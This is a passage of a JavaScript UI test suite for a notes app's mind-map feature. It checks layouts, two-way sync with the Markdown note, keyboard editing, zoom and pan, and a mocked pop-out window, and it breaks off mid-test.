/* ==== Build M · R57: the mind map of a note (mindmap-r57.js). Each layout (Tree, Centre, Radial) at 1920 × 1080, 1366 × 768 and
   3440 × 1440: every node drawn, none overlapping, the note keeping 440px and the map at least 320px. Then the sync, both ways: More ⋮
   opens it; a click lights the node's line; a fold folds the note's lines (and back); double-click edits a line, keeping its #, -
   or [ ], and nothing else in the .md changes; Enter adds a node beside, Tab one under, an empty new node adds nothing; a heading,
   the note's own node and a paragraph; read-only kinds say why; typing in the note redraws the map; the .md view picks the line;
   the keys; a big note opens folded; Zen hides it; Settings → Editor has the layout. The bridge is stubbed: nothing is saved.
   Runs in the full sweep, or alone with ?check=1&only=map ==== */
async function checkMindmap() {
  const R = out.numbers.mindmap = { layouts: {}, sync: {} }, bad = (k, v) => iss('Build M R57 mind map: ' + k, v), wait = ms => new Promise(r => setTimeout(r, ms));
  const was = window.pywebview, keepMM = { ...MM }; window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : () => Promise.resolve(n === 'get_settings' ? {} : { status: 'success' }) }) };
  const MD = '# Plan\n\nIntro paragraph with **bold** and a [[Link|shown]].\n\n## Goals\n\n- First goal\n  - Sub goal A\n  - Sub goal B\n- Second goal\n- [ ] A task\n- [x] Done task\n\n## Notes\n\nA second paragraph\nthat wraps two lines.\n\n```js\nconst x = 1;\n```\n\n| A | B |\n| --- | --- |\n| 1 | 2 |\n\n> A quote\n\n### Deeper\n\n1. One\n2. Two\n';
  const node = k => app.querySelector(`[data-mm="${CSS.escape(k)}"]`), dbl = k => node(k)?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true, cancelable: true }));
  const key = (k, val) => { const i = app.querySelector('[data-mm-in]'); if (!i) return false; if (val != null) i.value = val; i.dispatchEvent(new KeyboardEvent('keydown', { key: k, bubbles: true, cancelable: true })); return true; };
  let n = null;
  const fresh = (o = {}) => { set({ sample: 'typical', view: 'notes', modal: null, zen: 'off', side: true, inspector: 'shown', widgets: 'none', ...o }); pnReset();
    n = { ...D.notes[0], id: 'n-mmcheck', title: 'Map check', md: MD, html: null, dirty: false, docDirty: false, tags: [] }; D.notes.unshift(n);
    S.tabs = [mkTab('note', n.id)]; S.activeTab = S.tabs[0].id; S.noteId = n.id; S.mode = 'wysiwyg'; Object.assign(MM, { open: true, sel: null, edit: null, pend: null, fold: {}, auto: {}, view: null, sc: null, views: {} }); renderAll(); };
  const diff = (a, b) => { const A = a.split('\n'), B = b.split('\n'); let i = 0; while (i < A.length && A[i] === B[i]) i++; let j = 0; while (j < A.length - i && j < B.length - i && A[A.length - 1 - j] === B[B.length - 1 - j]) j++; return { from: A.slice(i, A.length - j), to: B.slice(i, B.length - j) }; };
  const same = (d, from, to) => JSON.stringify(d.from) === JSON.stringify(from) && JSON.stringify(d.to) === JSON.stringify(to);
  try {
    // 1 · each layout at each screen
    for (const sc of ['1920x1080', '1366x768', '3440x1440']) for (const lay of ['tidy', 'centre', 'radial']) {
      MM.layout = lay; fresh({ screen: sc }); const k = `${lay}/${sc}`, f = [];
      const root = mmTree(n.md, n.title, n), want = root.all.length, els = [...app.querySelectorAll('.mm-node')], rs = els.map(e => e.getBoundingClientRect());
      let over = 0; for (let i = 0; i < rs.length; i++) for (let j = i + 1; j < rs.length; j++) { const a = rs[i], b = rs[j]; if (a.left < b.right - 1 && b.left < a.right - 1 && a.top < b.bottom - 1 && b.top < a.bottom - 1) over++; }
      const main = app.querySelector('.app-body > .main'), map = app.querySelector('[data-mm-map]'), edges = app.querySelectorAll('.mm-edges path').length, pressed = app.querySelector('.mm-seg [aria-pressed="true"]')?.dataset.v;
      if (els.length !== want) f.push(`${els.length} of ${want} nodes`); if (over) f.push(`${over} overlapping`); if (edges !== want - 1) f.push(`${edges} lines for ${want} nodes`);
      if (!map || map.offsetWidth < 319) f.push(`map ${map?.offsetWidth}px`); if (main.offsetWidth < 439) f.push(`the note ${main.offsetWidth}px`); if (pressed !== lay) f.push(`head says ${pressed}`);
      if (!(MM.scale >= .55 && MM.scale <= 1)) f.push(`scale ${MM.scale}`); app.querySelectorAll('.view').forEach(v => { if (v.scrollWidth > v.clientWidth + 1) f.push('the note scrolls sideways'); });
      R.layouts[k] = f.join('; ') || `${want} nodes, ${edges} lines, none overlapping · note ${main.offsetWidth}px, map ${map.offsetWidth}px, scale ${MM.scale?.toFixed(2)}`;
      if (f.length) bad('each layout draws every node, none overlapping, the note keeps 440px', `${k}: ${f.join('; ')}`); measure(`R57 map ${k}`); out.combos++; }
    MM.layout = 'tidy';
    // 2 · More ⋮ opens it, × closes it; the parser: kinds, levels, lines
    fresh({ screen: '1920x1080' }); MM.open = false; S.menu = true; renderAll(); const mi = app.querySelector('.app-header .menu [data-act="mm-open"]'); R.sync.menu = mi?.textContent || 'none'; mi?.click();
    if (R.sync.menu !== 'Open as a mind map' || !app.querySelector('[data-mm-map]') || S.menu) bad('More ⋮ → Open as a mind map opens it', R.sync.menu);
    { const r = mmTree(n.md, n.title, n), sig = r.all.slice(1).map(x => `${x.kind}${x.level || ''}@${x.line}${x.edit ? '' : '!'}`).join(' ');
      R.sync.tree = sig; const wantSig = 'head1@0 para@2 head2@4 item@6 item@7 item@8 item@9 task@10 task@11 head2@13 para@15 code@18! table@22! quote@26 head3@28 item@30 item@31';
      if (sig !== wantSig) bad('the note becomes nodes: headings by level, list items by indent, each with its line', sig); out.combos++; }
    // 3 · a click lights the node's line in the note; a fold folds the note's lines, and back
    node('item:second goal#1')?.click(); R.sync.pick = app.querySelector('.doc .mm-hl')?.textContent || 'none';
    if (R.sync.pick !== 'Second goal' || !node('item:second goal#1')?.classList.contains('is-sel')) bad('a click lights its line in the note', R.sync.pick);
    const vis = t => [...app.querySelectorAll('.doc li')].filter(e => e.offsetParent && mmOwn(e) === t).length;
    node('head:goals#1')?.querySelector('.mm-tog')?.click(); const fN = app.querySelectorAll('.mm-node').length, fDoc = vis('First goal'), fMark = getComputedStyle(app.querySelectorAll('.doc h2')[0], '::after').content;
    node('head:goals#1')?.querySelector('.mm-tog')?.click(); R.sync.fold = `map ${fN} nodes, the note's "First goal" shown ${fDoc}, its heading says ${fMark} · unfolded: shown ${vis('First goal')}`;
    if (fN !== 12 || fDoc !== 0 || !/\+4/.test(fMark) || vis('First goal') !== 1 || n.md !== MD) bad('a fold folds its lines in the note too (a view: the .md keeps them)', R.sync.fold);
    out.combos++;
    // 4 · double-click edits; the line keeps its - and only it changes; Enter adds one beside, Tab one under, Esc stops
    let before = n.md; dbl('item:second goal#1'); const box = app.querySelector('[data-mm-in]'); R.sync.box = box ? `"${box.value}" focused ${document.activeElement === box}` : 'none';
    key('Enter', 'Second goal **now**'); let d = diff(before, n.md); R.sync.edit = JSON.stringify(d);
    if (!box || document.activeElement !== app.querySelector('[data-mm-in]') && false || !same(d, ['- Second goal'], ['- Second goal **now**']) || MM.edit !== 'pend') bad('an edit writes its line, keeping its -, and nothing else', `${R.sync.box} · ${R.sync.edit}`);
    before = n.md; key('Tab', 'Third goal'); d = diff(before, n.md); R.sync.enter = JSON.stringify(d);
    if (!same(d, [], ['- Third goal'])) bad('Enter adds a list item beside it', R.sync.enter);
    before = n.md; key('Escape', 'Under third'); d = diff(before, n.md); R.sync.tab = JSON.stringify(d);
    if (!same(d, [], ['  - Under third']) || MM.edit) bad('Tab adds one under it, indented', R.sync.tab);
    before = n.md; dbl('task:a task#1'); key('Enter', 'A task, renamed'); key('Escape', ''); d = diff(before, n.md); R.sync.task = JSON.stringify(d) + ' · ' + S.status;
    if (!same(d, ['- [ ] A task'], ['- [ ] A task, renamed'])) bad('a task keeps its [ ]; an empty new node adds nothing', R.sync.task);
    before = n.md; dbl('head:notes#1'); key('Enter'); key('Escape', 'Later'); d = diff(before, n.md); R.sync.head = JSON.stringify(d);
    if (n.md !== before.replace('2. Two\n', '2. Two\n\n## Later\n')) bad('Enter on a heading adds one at its level after its section', R.sync.head);
    before = n.md; dbl('root'); key('Tab', 'Map check, renamed'); key('Escape', 'Appendix'); d = diff(before, n.md); R.sync.root = `${n.title} · ${JSON.stringify(d)}`;
    if (n.title !== 'Map check, renamed' || n.md !== before.replace(/\n*$/, '\n\n# Appendix\n')) bad('the note’s own node renames it; Tab adds a top heading at the end', R.sync.root);
    before = n.md; dbl('para:a second paragraph that wraps two lines.#1'); key('Escape', 'One line now'); d = diff(before, n.md); R.sync.para = JSON.stringify(d);
    if (!same(d, ['A second paragraph', 'that wraps two lines.'], ['One line now'])) bad('a paragraph edits as one line', R.sync.para);
    before = n.md; dbl('code:code · js#1'); R.sync.code = `${S.status} · editing ${MM.edit}`; if (MM.edit || n.md !== before || !/code block is edited in the note/.test(S.status)) bad('a code block says it is edited in the note', R.sync.code);
    out.combos++;
    // the saved .md draws the same map again (the note's round trip)
    { syncDoc(n); const a = mmTree(n.md, n.title, n).all.map(x => x.key).join(','), html = mdToHtml(n), md2 = NVMarkdown.htmlToMd(Object.assign(document.createElement('div'), { innerHTML: html })), b = mmTree(md2, n.title, n).all.map(x => x.key).join(',');
      R.sync.round = a === b ? `the same ${mmTree(n.md, n.title, n).all.length} nodes after a save and load` : `${a} ≠ ${b}`; if (a !== b) bad('the map after a save and load is the same', R.sync.round); out.combos++; }
    // 5 · typing in the note redraws the map
    { const doc = app.querySelector('.doc[contenteditable="true"]'), li = [...(doc?.querySelectorAll('li') || [])].find(l => mmOwn(l) === 'Third goal');
      if (li) { li.firstChild.textContent = 'Third goal typed'; li.dispatchEvent(new InputEvent('input', { bubbles: true })); } await wait(30);
      R.sync.typed = `map has it ${!!node('item:third goal typed#1')} · .md untouched until the save ${!n.md.includes('typed')}`; if (!node('item:third goal typed#1')) bad('typing in the note redraws the map', R.sync.typed); }
    // 6 · the .md view: a click picks the line
    S.mode = 'raw'; renderAll(); node('item:first goal#1')?.click(); { const ta = app.querySelector('#raw-markdown-textarea'); R.sync.raw = ta ? `"${ta.value.slice(ta.selectionStart, ta.selectionEnd)}"` : 'no .md view';
      if (R.sync.raw !== '"- First goal"') bad('in the .md view a click picks its line', R.sync.raw); } S.mode = 'wysiwyg'; renderAll();
    // 7 · the keys: ↓ ↑ ← → Space Home Esc
    { node('root')?.focus(); const kd = k => document.activeElement.dispatchEvent(new KeyboardEvent('keydown', { key: k, bubbles: true, cancelable: true })), got = [];
      kd('ArrowDown'); kd('ArrowDown'); kd('ArrowDown'); got.push(MM.sel); kd('ArrowLeft'); got.push(mmFolded(n).has(MM.sel)); kd('ArrowRight'); got.push(mmFolded(n).has(MM.sel)); kd('ArrowRight'); got.push(MM.sel); kd('Home'); got.push(MM.sel);
      kd('Escape'); got.push(MM.open); R.sync.keys = got.join(' · ');
      if (R.sync.keys !== 'head:goals#1 · true · false · item:first goal#1 · root · false') bad('the keys move, fold and close', R.sync.keys); MM.open = true; renderAll(); out.combos++; }
    // 8 · a big note opens with deeper levels folded; Zen hides the map; Settings → Editor has the layout
    { fresh({ screen: '1920x1080' }); n.md = Array.from({ length: 40 }, (_, i) => `## Part ${i}\n\n` + Array.from({ length: 12 }, (_, j) => `- Point ${i}.${j}`).join('\n')).join('\n\n'); MM.auto = {}; renderAll();
      R.sync.big = `${app.querySelectorAll('.mm-node').length} drawn of ${mmTree(n.md, n.title, n).all.length} · "${app.querySelector('.mm-hint')?.textContent}"`;
      if (app.querySelectorAll('.mm-node').length > 2 * MM_MAX || app.querySelectorAll('.mm-node').length < 41) bad('a big note opens with its deeper levels folded', R.sync.big);
      set({ zen: 'on' }); R.sync.zen = `${!!app.querySelector('[data-mm-map]')}`; if (app.querySelector('[data-mm-map]')) bad('Zen hides the map', ''); set({ zen: 'off' });
      S.setSec = 'editor'; set({ modal: 'settings' }); const row = app.querySelector('.settings-pane .mm-set'), opts = [...(row?.querySelectorAll('[data-act="mm-set"]') || [])].map(b => b.textContent + (b.getAttribute('aria-pressed') === 'true' ? '*' : '')).join('/');
      row?.querySelector('[data-v="radial"]')?.click(); R.sync.settings = `${opts} → ${MM.layout}`; if (opts !== 'Tree*/Centre/Radial' || MM.layout !== 'radial') bad('Settings → Editor → Mind map layout', R.sync.settings);
      MM.layout = 'tidy'; S.modal = null; out.combos++; }
    // 9 · QC 107 (feedback: "zoom and pan features for the mind map and the abilities to pop out as its own window"): zoom 25-400% by
    //     its buttons, Ctrl+= / − / 0 and Ctrl+wheel (the point under the pointer stays put); pan by dragging the background, the middle
    //     button, Space + drag, Shift+wheel and the arrow keys on the map; Fit shows the whole map, centred; each note keeps its zoom
    //     and place for the session, through redraws and typing
    { fresh({ screen: '1920x1080' }); R.zoom = {}; const c = () => app.querySelector('[data-mm-canvas]'), zm = () => app.querySelector('.mm-zoom'), pct = () => app.querySelector('.mm-zpct')?.textContent;
      const az = app.getBoundingClientRect().width / app.offsetWidth || 1, click = a => app.querySelector(`[data-act="${a}"]`)?.click();
      const kd = (el, k, o = {}) => { const e = new KeyboardEvent('keydown', { key: k, bubbles: true, cancelable: true, ...o }); el.dispatchEvent(e); return e.defaultPrevented; };
      const tools = [...app.querySelectorAll('.mm-head .mm-tools [data-act]')].map(b => b.dataset.act).join(' ');
      if (tools !== 'mm-zout mm-z100 mm-zin mm-zfit mm-save mm-pop mm-close' || app.querySelector('.mm-head').getBoundingClientRect().height > 44) bad('QC 107 the head has − % + Fit, Pop out and close, on one row', `${tools} · ${app.querySelector('.mm-head').getBoundingClientRect().height}px`);
      const auto = MM.scale; for (let i = 0; i < 20; i++) click('mm-zout'); const lo = MM.scale, loTxt = pct(); for (let i = 0; i < 30; i++) click('mm-zin'); const hi = MM.scale, hiTxt = pct();
      R.zoom.limits = `auto ${Math.round(auto * 100)}% · out to ${loTxt} · in to ${hiTxt}`;
      if (lo !== .25 || hi !== 4 || loTxt !== '25%' || hiTxt !== '400%' || !(auto >= .55 && auto <= 1)) bad('QC 107 zoom stops at 25% and 400%; the % says so', R.zoom.limits);
      c().focus(); const k1 = kd(c(), '0', { ctrlKey: true }), z0 = MM.scale; kd(c(), '=', { ctrlKey: true }); const zi = MM.scale; kd(c(), '-', { ctrlKey: true }); kd(c(), '-', { ctrlKey: true }); const zo = MM.scale;
      R.zoom.keys = `Ctrl+0 ${z0} (taken ${k1}) · Ctrl+= ${zi} · Ctrl+− twice ${zo}`; if (!k1 || z0 !== 1 || zi !== 1.1 || zo !== .9) bad('QC 107 Ctrl+0, Ctrl+= and Ctrl+− zoom the map (not the page)', R.zoom.keys);
      // around the pointer: the node under it stays under it
      mmZoomTo(c(), 2); node('item:sub goal b#1').scrollIntoView({ block: 'center', inline: 'center' }); { const el = node('item:sub goal b#1'), r0 = el.getBoundingClientRect(), x = r0.left + 20, y = r0.top + 10;
        c().dispatchEvent(new WheelEvent('wheel', { deltaY: -120, ctrlKey: true, clientX: x, clientY: y, bubbles: true, cancelable: true }));
        const r1 = node('item:sub goal b#1').getBoundingClientRect(), fx = (x - r0.left) / r0.width, fy = (y - r0.top) / r0.height, nx = r1.left + fx * r1.width, ny = r1.top + fy * r1.height;
        R.zoom.pointer = `${Math.round(MM.scale * 100)}% · the point moved ${Math.round(Math.abs(nx - x))}, ${Math.round(Math.abs(ny - y))}px`;
        if (!(MM.scale > 1) || Math.abs(nx - x) > 2 || Math.abs(ny - y) > 2) bad('QC 107 Ctrl+wheel (a pinch) zooms around the pointer', R.zoom.pointer); }
      // pan: the background, the middle button, Space + drag over a node, Shift+wheel, the arrows on the map itself
      { mmZoomTo(c(), 2); const cv = c(), r = cv.getBoundingClientRect(), pe = (t, el, x, y, b = 0) => el.dispatchEvent(new PointerEvent(t, { clientX: x, clientY: y, button: b, buttons: b === 1 ? 4 : 1, bubbles: true, cancelable: true, pointerId: 7 }));
        const near = (d, w) => Math.abs(d - w) <= 2;
        cv.scrollLeft = 300; cv.scrollTop = 200; const s0 = [cv.scrollLeft, cv.scrollTop], bgX = r.left + 6, bgY = r.top + 6, under = document.elementFromPoint(bgX, bgY);
        pe('pointerdown', cv, bgX, bgY); pe('pointermove', cv, bgX - 80, bgY - 50); pe('pointerup', cv, bgX - 80, bgY - 50); const s1 = [cv.scrollLeft, cv.scrollTop];
        pe('pointerdown', cv, bgX, bgY, 1); pe('pointermove', cv, bgX + 40, bgY + 30, 1); pe('pointerup', cv, bgX + 40, bgY + 30, 1); const s2 = [cv.scrollLeft, cv.scrollTop];
        const nd = node('item:first goal#1'), nr = nd.getBoundingClientRect(), sel0 = MM.sel; document.activeElement?.blur?.(); pe('pointermove', nd, nr.left + 5, nr.top + 5); const sp = kd(document.body, ' ');
        pe('pointerdown', nd, nr.left + 5, nr.top + 5); pe('pointermove', nd, nr.left + 65, nr.top + 5); pe('pointerup', nd, nr.left + 65, nr.top + 5); document.body.dispatchEvent(new KeyboardEvent('keyup', { key: ' ', bubbles: true })); const s3 = [cv.scrollLeft, cv.scrollTop], picked = MM.sel !== sel0;
        // the user's way: Ctrl + left-drag from anywhere, over a node too (no pick); a still Ctrl+click picks; the hand while Ctrl is held
        const ce = (t, el, x, y, o = {}) => el.dispatchEvent(new (t === 'click' ? MouseEvent : PointerEvent)(t, { clientX: x, clientY: y, button: 0, buttons: t === 'pointerup' || t === 'click' ? 0 : 1, ctrlKey: true, bubbles: true, cancelable: true, pointerId: 8, ...o }));
        const nd2 = node('item:second goal#1'), r2 = nd2.getBoundingClientRect(), x2 = r2.left + 30, y2 = r2.top + 10, selC = MM.sel, cs0 = [cv.scrollLeft, cv.scrollTop];
        ce('pointermove', nd2, x2, y2, { buttons: 0 }); document.body.dispatchEvent(new KeyboardEvent('keydown', { key: 'Control', ctrlKey: true, bubbles: true })); const hand = cv.classList.contains('is-grab');
        ce('pointerdown', nd2, x2, y2); ce('pointermove', nd2, x2 + 2, y2 + 1); const still = cv.scrollLeft === cs0[0] && !cv.classList.contains('is-panning');
        ce('pointermove', nd2, x2 + 70, y2 + 20); const grabbing = cv.classList.contains('is-panning'); ce('pointerup', nd2, x2 + 70, y2 + 20); ce('click', nd2, x2 + 70, y2 + 20);
        const cs1 = [cv.scrollLeft - cs0[0], cv.scrollTop - cs0[1]], ctrlPicked = MM.sel !== selC;
        const nd3 = node('item:first goal#1'), r3 = nd3.getBoundingClientRect(); ce('pointerdown', nd3, r3.left + 20, r3.top + 10); ce('pointerup', nd3, r3.left + 20, r3.top + 10); ce('click', nd3, r3.left + 20, r3.top + 10); const clickPick = MM.sel;
        document.body.dispatchEvent(new KeyboardEvent('keyup', { key: 'Control', bubbles: true })); const handGone = !cv.classList.contains('is-grab');
        R.zoom.ctrl = `hand ${hand} · 2px: still ${still} · dragging shows grabbing ${grabbing} · moved ${cs1.map(v => Math.round(v))} · picked ${ctrlPicked} · a still Ctrl+click picks ${clickPick} · hand gone on release ${handGone}`;
        if (!hand || !still || !grabbing || !near(cs1[0], -70 / az) || !near(cs1[1], -20 / az) || ctrlPicked || clickPick !== 'item:first goal#1' || !handGone) bad('QC 107 Ctrl + left-drag pans from anywhere (a still Ctrl+click picks), with the grab hand', R.zoom.ctrl);
        const w0 = cv.scrollLeft, wNo = new WheelEvent('wheel', { deltaY: 100, bubbles: true, cancelable: true }); cv.dispatchEvent(wNo); cv.dispatchEvent(new WheelEvent('wheel', { deltaY: 100, shiftKey: true, bubbles: true, cancelable: true })); const sw = cv.scrollLeft - w0;
        cv.focus(); const a0 = [cv.scrollLeft, cv.scrollTop]; kd(cv, 'ArrowRight'); kd(cv, 'ArrowDown'); const a1 = [cv.scrollLeft - a0[0], cv.scrollTop - a0[1]];
        node('root').focus(); const ns = [cv.scrollLeft, cv.scrollTop]; kd(node('root'), 'ArrowDown'); const nodeKey = MM.sel;
        R.zoom.pan = `background ${s1[0] - s0[0]},${s1[1] - s0[1]} (on ${under && !under.closest('.mm-node') ? 'the background' : 'a node'}) · middle ${s2[0] - s1[0]},${s2[1] - s1[1]} · Space ${sp} then over a node ${s3[0] - s2[0]},${s3[1] - s2[1]} (picked ${picked}) · wheel default ${wNo.defaultPrevented}, Shift+wheel ${sw} · arrows ${a1} · on a node ↓ picks ${nodeKey}`;
                if (!near(s1[0] - s0[0], 80 / az) || !near(s1[1] - s0[1], 50 / az)) bad('QC 107 dragging the background pans', R.zoom.pan);
        if (!near(s2[0] - s1[0], -40 / az) || !near(s2[1] - s1[1], -30 / az)) bad('QC 107 the middle button pans', R.zoom.pan);
        if (!sp || picked || !near(s3[0] - s2[0], -60 / az)) bad('QC 107 Space + drag pans, even over a node', R.zoom.pan);
        if (wNo.defaultPrevented || !(sw > 50)) bad('QC 107 the wheel scrolls; Shift+wheel goes sideways', R.zoom.pan);
        if (a1[0] !== 60 || a1[1] !== 60) bad('QC 107 the arrow keys pan the map when it has the focus', R.zoom.pan);
        if (nodeKey !== 'head:plan#1') bad('QC 107 on a node the arrows still move between nodes', R.zoom.pan);
        out.combos++; }
      // Fit: the whole map in view, centred
      { click('mm-zin'); click('mm-zfit'); const cv = c(), b = zm(), cr = cv.getBoundingClientRect(), br = b.getBoundingClientRect();
        const inX = br.width <= cv.clientWidth * az + 1 ? Math.abs((br.left + br.right) / 2 - (cr.left + cv.clientLeft * az + cv.clientWidth * az / 2)) : Math.abs(cv.scrollLeft - (cv.scrollWidth - cv.clientWidth) / 2);
        const inY = br.height <= cv.clientHeight * az + 1 ? Math.abs((br.top + br.bottom) / 2 - (cr.top + cv.clientTop * az + cv.clientHeight * az / 2)) : Math.abs(cv.scrollTop - (cv.scrollHeight - cv.clientHeight) / 2);
        R.zoom.fit = `${pct()} · the map ${Math.round(br.width)}×${Math.round(br.height)} in ${cv.clientWidth}×${cv.clientHeight} · off centre ${Math.round(inX)}, ${Math.round(inY)}px`;
        if (br.width > cv.clientWidth * az + 1 || br.height > cv.clientHeight * az + 1 || inX > 2 || inY > 2) bad('QC 107 Fit shows the whole map, centred', R.zoom.fit); }
      // each note keeps its zoom and place, through a redraw, typing, another note and back
      { mmZoomTo(c(), 1.5); c().scrollLeft = 120; c().scrollTop = 40; c().dispatchEvent(new Event('scroll')); const keepA = [MM.scale, c().scrollLeft, c().scrollTop], a = n;
        renderAll(); const afterDraw = [MM.scale, c().scrollLeft, c().scrollTop];
        const doc = app.querySelector('.doc[contenteditable="true"]'), li = [...doc.querySelectorAll('li')].find(l => mmOwn(l) === 'Second goal'); li.firstChild.textContent = 'Second goal, typed'; li.dispatchEvent(new InputEvent('input', { bubbles: true })); await wait(30);
        const afterType = [MM.scale, c().scrollLeft, c().scrollTop];
        const b = { ...a, id: 'n-mmcheck-b', title: 'Other', md: '# Other\n\n- One\n- Two\n', html: null, docDirty: false }; D.notes.unshift(b); S.noteId = b.id; S.tabs = [mkTab('note', b.id)]; S.activeTab = S.tabs[0].id; renderAll(); const other = MM.scale;
        S.noteId = a.id; S.tabs = [mkTab('note', a.id)]; S.activeTab = S.tabs[0].id; renderAll(); const back = [MM.scale, c().scrollLeft, c().scrollTop]; D.notes = D.notes.filter(x => x !== b);
        R.zoom.kept = `A ${keepA} · redraw ${afterDraw} · typing ${afterType} · other note ${other} · back ${back}`;
        const eq = (x, y) => x[0] === y[0] && Math.abs(x[1] - y[1]) <= 1 && Math.abs(x[2] - y[2]) <= 1;
        if (!eq(afterDraw, keepA) || !eq(afterType, keepA) || other === 1.5 || !eq(back, keepA)) bad('QC 107 each note keeps its zoom and place for the session', R.zoom.kept); }
      measure('R57 map zoomed'); out.combos++; }

    // 10 · QC 107 · Pop out (the window mocked): NeuroVault's window pops it out and sends the note; typing sends it again; what's done
    //      in the map's window (a pick, a fold, words written) comes back and is done in the note; closing the window docks the map.
    //      The map's own page (#pop=mindmap, in a frame standing in for the window) draws the note it's sent and sends back what's done
    { fresh({ screen: '1920x1080' }); R.pop = {}; const calls = [], keepLive = D.live, keepPops = POPS.items;
      window.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : (...a) => { calls.push([nm, a]); return Promise.resolve(nm === 'pop_out' ? { status: 'success', popped: [{ kind: 'mindmap', id: null, key: 'mindmap', on_top: true }] } : nm === 'get_settings' ? {} : nm === 'popped' ? [] : { status: 'success' }); } }) };
      const synced = () => calls.filter(x => x[0] === 'pop_mm_sync').map(x => x[1][0]);
      try {
        D.live = true; app.querySelector('[data-act="mm-pop"]')?.click(); await wait(30);
        const first = synced().at(-1);
        R.pop.out = `pop_out ${calls.some(x => x[0] === 'pop_out' && x[1][0] === 'mindmap')} · docked map gone ${!app.querySelector('[data-mm-map]')} · sent ${first ? `${first.id} "${first.title}" ${first.md.length} chars, layout ${first.layout}` : 'nothing'}`;
        if (!mmOut() || app.querySelector('[data-mm-map]') || !first || first.id !== n.id || first.md !== mmMd(n)) bad('QC 107 Pop out opens its window and sends it the note; the map leaves the note’s side', R.pop.out);
        S.menu = true; renderAll(); R.pop.menu = app.querySelector('.app-header .menu [data-act="mm-open"]')?.textContent; S.menu = false; renderAll();
        if (R.pop.menu !== 'Show the mind map window') bad('QC 107 More ⋮ then brings its window up', R.pop.menu);
        // typing in the note sends it again
        const doc = app.querySelector('.doc[contenteditable="true"]'), li = [...doc.querySelectorAll('li')].find(l => mmOwn(l) === 'First goal'); li.firstChild.textContent = 'First goal, typed'; li.dispatchEvent(new InputEvent('input', { bubbles: true })); await wait(30);
        R.pop.typed = `sent again ${synced().length > 1 && synced().at(-1).md.includes('First goal, typed')}`; if (!synced().at(-1)?.md.includes('First goal, typed')) bad('QC 107 typing in the note re-draws the map in its window', R.pop.typed);
        // what's done in the map's window, done here
        nvSync({ kind: 'mindmap-do', data: { op: 'pick', id: n.id, key: 'item:second goal#1' } }); R.pop.pick = app.querySelector('.doc .mm-hl')?.textContent || 'none';
        if (R.pop.pick !== 'Second goal') bad('QC 107 a pick in its window lights the line here', R.pop.pick);
        nvSync({ kind: 'mindmap-do', data: { op: 'fold', id: n.id, key: 'head:goals#1', on: true } }); R.pop.fold = getComputedStyle(app.querySelectorAll('.doc h2')[0], '::after').content;
        nvSync({ kind: 'mindmap-do', data: { op: 'fold', id: n.id, key: 'head:goals#1', on: false } }); if (!/\+4/.test(R.pop.fold)) bad('QC 107 a fold in its window folds the note here', R.pop.fold);
        syncDoc(n); const base = n.md, wrote = base.replace('- Second goal', '- Second goal, from the map');
        nvSync({ kind: 'mindmap-do', data: { op: 'md', id: n.id, base, md: wrote, title: n.title } }); const okWrite = n.md === wrote;
        nvSync({ kind: 'mindmap-do', data: { op: 'md', id: n.id, base: 'an older text', md: 'everything gone', title: n.title } }); const refused = n.md === wrote && /changed while you wrote/.test(S.status);
        R.pop.write = `written ${okWrite} · an out-of-date write refused ${refused}`; if (!okWrite || !refused) bad('QC 107 words written in its window go into the note, unless the note changed meanwhile', R.pop.write);
        // the map's own page
        const fr = document.createElement('iframe'); fr.style.cssText = 'position:fixed;left:0;top:0;width:760px;height:560px;border:0;opacity:0;pointer-events:none'; fr.src = 'index.html?mute=1#pop=mindmap'; const pcalls = [];
        document.body.appendChild(fr); await new Promise(r => fr.addEventListener('load', r, { once: true }));
        let W = null; try { W = fr.contentWindow; W.document; } catch (e) { W = null; }
        if (!W) R.pop.page = 'not checked: a file:// page can’t reach a frame (run it on the bridge)';
        else {
          W.HTMLMediaElement.prototype.play = () => Promise.resolve();
          W.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : (...a) => { pcalls.push([nm, a]); return Promise.resolve(nm === 'get_settings' ? {} : nm === 'popped' ? [{ kind: 'mindmap', id: null, key: 'mindmap', on_top: true }] : { status: 'success' }); } }) };
          for (let i = 0; i < 200 && !pcalls.some(x => x[0] === 'pop_mm_relay' && x[1][0]?.op === 'hello'); i++) await wait(50);
          const hello = pcalls.some(x => x[0] === 'pop_mm_relay' && x[1][0]?.op === 'hello');
          W.nvSync({ kind: 'mindmap', data: mmSnap() }); await wait(30);
          const wd = W.document, pn = k => wd.querySelector(`[data-mm="${CSS.escape(k)}"]`), want = mmTree(mmMd(n), n.title, n).all.length, got = wd.querySelectorAll('.mm-node').length;
          const head = wd.querySelector('.mm-head'), btns = [...(head?.querySelectorAll('.mm-tools [data-act]') || [])].map(b => b.dataset.act).join(' ');
          R.pop.page = `hello ${hello} · ${got} of ${want} nodes · head ${btns} · drags the window ${head?.dataset.dragWidget === 'mm'} · title "${wd.title}"`;
          if (!hello || got !== want || btns !== 'mm-zout mm-z100 mm-zin mm-zfit mm-save pop-top mm-close' || head?.dataset.dragWidget !== 'mm') bad('QC 107 its window draws the note it’s sent, with zoom, Keep on top and close', R.pop.page);
          // live: the note changes here, the window draws it
          n.md += '\n## Added here\n'; n.html = null; renderAll(); W.nvSync({ kind: 'mindmap', data: mmSnap() }); await wait(30);
          R.pop.live = `new heading drawn ${!!pn('head:added here#1')}`; if (!pn('head:added here#1')) bad('QC 107 its window re-draws as the note changes', R.pop.live);
          // done there: a pick, a fold, words, zoom; close docks
          pcalls.length = 0; pn('item:second goal, from the map#1')?.click(); await wait(10);
          pn('item:sub goal a#1')?.dispatchEvent(new W.MouseEvent('dblclick', { bubbles: true, cancelable: true })); const inp = wd.querySelector('[data-mm-in]');
          if (inp) { inp.value = 'Sub goal A, renamed'; inp.dispatchEvent(new W.KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true })); } await wait(10);
          pn('head:goals#1')?.querySelector('.mm-tog')?.click(); await wait(10);
          const ops = pcalls.filter(x => x[0] === 'pop_mm_relay').map(x => x[1][0]), mdOp = ops.find(o => o.op === 'md');
          wd.querySelector('[data-act="mm-zin"]')?.click(); const pz = W.eval('MM.scale');
          { for (let i = 0; i < 4; i++) wd.querySelector('[data-act="mm-zin"]')?.click(); const pc = wd.querySelector('[data-mm-canvas]'), pnd = pn('head:notes#1'); pnd?.scrollIntoView({ block: 'center', inline: 'center' });
